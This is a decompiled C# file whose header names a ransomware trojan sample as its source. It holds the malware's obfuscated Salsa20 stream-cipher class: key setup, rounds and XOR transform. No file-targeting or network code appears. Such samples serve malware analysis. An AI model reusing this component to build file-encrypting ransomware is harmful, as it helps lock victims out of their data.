// Decompiled with JetBrains decompiler
// Type: NS001.sAdFSOOagDt
// Assembly: Worker-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E50A6D0-CF23-40BF-9617-750EB84D00C0
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-122df846a943e419c3a31f65b6e67e7570134612b2dfd45638e0edd23e214036.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace NS001
{
  public sealed class sAdFSOOagDt : SymmetricAlgorithm
  {
    private int f00004f;
    [NonSerialized]
    internal static GetString f00003f;

    public static byte[] m00002a(byte[] p0, byte[] p1, byte[] p2)
    {
      byte[] numArray1 = (byte[]) null;
      byte[] numArray2 = p1;
      byte[] numArray3 = p2;
      using (sAdFSOOagDt sAdFsoOagDt = new sAdFSOOagDt())
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          sAdFsoOagDt.Key = numArray2;
          sAdFsoOagDt.IV = numArray3;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, sAdFsoOagDt.CreateEncryptor(), CryptoStreamMode.Write))
          {
            byte[] buffer = p0;
            cryptoStream.Write(buffer, 0, buffer.Length);
            cryptoStream.FlushFinalBlock();
          }
          numArray1 = memoryStream.ToArray();
        }
      }
      return numArray1;
    }

    public sAdFSOOagDt()
    {
      this.LegalBlockSizesValue = new KeySizes[1]
      {
        new KeySizes(512, 512, 0)
      };
      this.LegalKeySizesValue = new KeySizes[1]
      {
        new KeySizes(128, 256, 128)
      };
      this.BlockSizeValue = 512;
      this.KeySizeValue = 256;
      this.f00004f = 20;
    }

    public override byte[] IV
    {
      get => base.IV;
      set
      {
        sAdFSOOagDt.KGiKmMXOepGdmMaC(value, nameof (value));
        this.IVValue = (byte[]) value.Clone();
      }
    }

    public override ICryptoTransform CreateDecryptor(byte[] p0, byte[] p1) => this.CreateEncryptor(p0, p1);

    public override ICryptoTransform CreateEncryptor(byte[] p0, byte[] p1)
    {
      if (p0 == null)
        throw new ArgumentNullException("rgbKey");
      if (!this.ValidKeySize(p0.Length * 8))
        throw new CryptographicException("Invalid key size; it must be 128 or 256 bits.");
      sAdFSOOagDt.KGiKmMXOepGdmMaC(p1, "rgbIV");
      return (ICryptoTransform) new sAdFSOOagDt.c000017(p0, p1, this.f00004f);
    }

    public override void GenerateIV() => this.IVValue = sAdFSOOagDt.GBfbXEGUftchhh(8);

    public override void GenerateKey() => this.KeyValue = sAdFSOOagDt.GBfbXEGUftchhh(this.KeySize / 8);

    private static void KGiKmMXOepGdmMaC(byte[] p0, string p1)
    {
      if (p0 == null)
        throw new ArgumentNullException(p1);
      if (p0.Length != 8)
        throw new CryptographicException("Invalid IV size; it must be 8 bytes.");
    }

    private static byte[] GBfbXEGUftchhh(int p0)
    {
      byte[] data = new byte[p0];
      using (RandomNumberGenerator randomNumberGenerator = (RandomNumberGenerator) new RNGCryptoServiceProvider())
        randomNumberGenerator.GetBytes(data);
      return data;
    }

    static sAdFSOOagDt() => Strings.CreateGetStringDelegate(typeof (sAdFSOOagDt));

    private sealed class c000017 : ICryptoTransform, IDisposable
    {
      private static readonly byte[] f000050;
      private static readonly byte[] BEDigcsBITb;
      private readonly int f00004f;
      private uint[] f000051;
      [NonSerialized]
      internal static GetString f000052;

      public c000017(byte[] p0, byte[] p1, int p2)
      {
        this.Initialize(p0, p1);
        this.f00004f = p2;
      }

      public bool CanReuseTransform => false;

      public bool CanTransformMultipleBlocks => true;

      public int InputBlockSize => 64;

      public int OutputBlockSize => 64;

      public int TransformBlock(byte[] p0, int p1, int p2, byte[] p3, int p4)
      {
        if (p0 == null)
          throw new ArgumentNullException("inputBuffer");
        if (p1 < 0 || p1 >= p0.Length)
          throw new ArgumentOutOfRangeException("inputOffset");
        if (p2 < 0 || p1 + p2 > p0.Length)
          throw new ArgumentOutOfRangeException("inputCount");
        if (p3 == null)
          throw new ArgumentNullException("outputBuffer");
        if (p4 < 0 || p4 + p2 > p3.Length)
          throw new ArgumentOutOfRangeException("outputOffset");
        if (this.f000051 == null)
          throw new ObjectDisposedException(this.GetType().Name);
        byte[] p0_1 = new byte[64];
        int num1 = 0;
        while (p2 > 0)
        {
          this.Hash(p0_1, this.f000051);
          this.f000051[8] = sAdFSOOagDt.c000017.AddOne(this.f000051[8]);
          if (this.f000051[8] == 0U)
            this.f000051[9] = sAdFSOOagDt.c000017.AddOne(this.f000051[9]);
          int num2 = Math.Min(64, p2);
          for (int index = 0; index < num2; ++index)
            p3[p4 + index] = (byte) ((uint) p0[p1 + index] ^ (uint) p0_1[index]);
          num1 += num2;
          p2 -= 64;
          p4 += 64;
          p1 += 64;
        }
        return num1;
      }

      public byte[] TransformFinalBlock(byte[] p0, int p1, int p2)
      {
        byte[] p3 = p2 >= 0 ? new byte[p2] : throw new ArgumentOutOfRangeException("inputCount");
        this.TransformBlock(p0, p1, p2, p3, 0);
        return p3;
      }

      public void Dispose()
      {
        if (this.f000051 != null)
          Array.Clear((Array) this.f000051, 0, this.f000051.Length);
        this.f000051 = (uint[]) null;
      }

      private static uint Rotate(uint p0, int p1) => p0 << p1 | p0 >> 32 - p1;

      private static uint Add(uint p0, uint p1) => p0 + p1;

      private static uint AddOne(uint p0) => p0 + 1U;

      private void Hash(byte[] p0, uint[] p1)
      {
        uint[] numArray = (uint[]) p1.Clone();
        for (int f00004f = this.f00004f; f00004f > 0; f00004f -= 2)
        {
          numArray[4] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[0], numArray[12]), 7);
          numArray[8] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[4], numArray[0]), 9);
          numArray[12] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[8], numArray[4]), 13);
          numArray[0] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[12], numArray[8]), 18);
          numArray[9] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[5], numArray[1]), 7);
          numArray[13] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[9], numArray[5]), 9);
          numArray[1] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[13], numArray[9]), 13);
          numArray[5] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[1], numArray[13]), 18);
          numArray[14] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[10], numArray[6]), 7);
          numArray[2] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[14], numArray[10]), 9);
          numArray[6] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[2], numArray[14]), 13);
          numArray[10] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[6], numArray[2]), 18);
          numArray[3] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[15], numArray[11]), 7);
          numArray[7] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[3], numArray[15]), 9);
          numArray[11] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[7], numArray[3]), 13);
          numArray[15] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[11], numArray[7]), 18);
          numArray[1] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[0], numArray[3]), 7);
          numArray[2] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[1], numArray[0]), 9);
          numArray[3] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[2], numArray[1]), 13);
          numArray[0] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[3], numArray[2]), 18);
          numArray[6] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[5], numArray[4]), 7);
          numArray[7] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[6], numArray[5]), 9);
          numArray[4] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[7], numArray[6]), 13);
          numArray[5] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[4], numArray[7]), 18);
          numArray[11] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[10], numArray[9]), 7);
          numArray[8] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[11], numArray[10]), 9);
          numArray[9] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[8], numArray[11]), 13);
          numArray[10] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[9], numArray[8]), 18);
          numArray[12] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[15], numArray[14]), 7);
          numArray[13] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[12], numArray[15]), 9);
          numArray[14] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[13], numArray[12]), 13);
          numArray[15] ^= sAdFSOOagDt.c000017.Rotate(sAdFSOOagDt.c000017.Add(numArray[14], numArray[13]), 18);
        }
        for (int index = 0; index < 16; ++index)
          sAdFSOOagDt.c000017.ToBytes(sAdFSOOagDt.c000017.Add(numArray[index], p1[index]), p0, 4 * index);
      }

      private void Initialize(byte[] p0, byte[] p1)
      {
        this.f000051 = new uint[16];
        this.f000051[1] = sAdFSOOagDt.c000017.ToUInt32(p0, 0);
        this.f000051[2] = sAdFSOOagDt.c000017.ToUInt32(p0, 4);
        this.f000051[3] = sAdFSOOagDt.c000017.ToUInt32(p0, 8);
        this.f000051[4] = sAdFSOOagDt.c000017.ToUInt32(p0, 12);
        byte[] p0_1 = p0.Length == 32 ? sAdFSOOagDt.c000017.f000050 : sAdFSOOagDt.c000017.BEDigcsBITb;
        int p1_1 = p0.Length - 16;
        this.f000051[11] = sAdFSOOagDt.c000017.ToUInt32(p0, p1_1);
        this.f000051[12] = sAdFSOOagDt.c000017.ToUInt32(p0, p1_1 + 4);
        this.f000051[13] = sAdFSOOagDt.c000017.ToUInt32(p0, p1_1 + 8);
        this.f000051[14] = sAdFSOOagDt.c000017.ToUInt32(p0, p1_1 + 12);
        this.f000051[0] = sAdFSOOagDt.c000017.ToUInt32(p0_1, 0);
        this.f000051[5] = sAdFSOOagDt.c000017.ToUInt32(p0_1, 4);
        this.f000051[10] = sAdFSOOagDt.c000017.ToUInt32(p0_1, 8);
        this.f000051[15] = sAdFSOOagDt.c000017.ToUInt32(p0_1, 12);
        this.f000051[6] = sAdFSOOagDt.c000017.ToUInt32(p1, 0);
        this.f000051[7] = sAdFSOOagDt.c000017.ToUInt32(p1, 4);
        this.f000051[8] = 0U;
        this.f000051[9] = 0U;
      }

      private static uint ToUInt32(byte[] p0, int p1) => (uint) ((int) p0[p1] | (int) p0[p1 + 1] << 8 | (int) p0[p1 + 2] << 16 | (int) p0[p1 + 3] << 24);

      private static void ToBytes(uint p0, byte[] p1, int p2)
      {
        p1[p2] = (byte) p0;
        p1[p2 + 1] = (byte) (p0 >> 8);
        p1[p2 + 2] = (byte) (p0 >> 16);
        p1[p2 + 3] = (byte) (p0 >> 24);
      }

      static c000017()
      {
        Strings.CreateGetStringDelegate(typeof (sAdFSOOagDt.c000017));
        sAdFSOOagDt.c000017.f000050 = Encoding.ASCII.GetBytes("expand 32-byte k");
        sAdFSOOagDt.c000017.BEDigcsBITb = Encoding.ASCII.GetBytes("expand 16-byte k");
      }
    }
  }
}
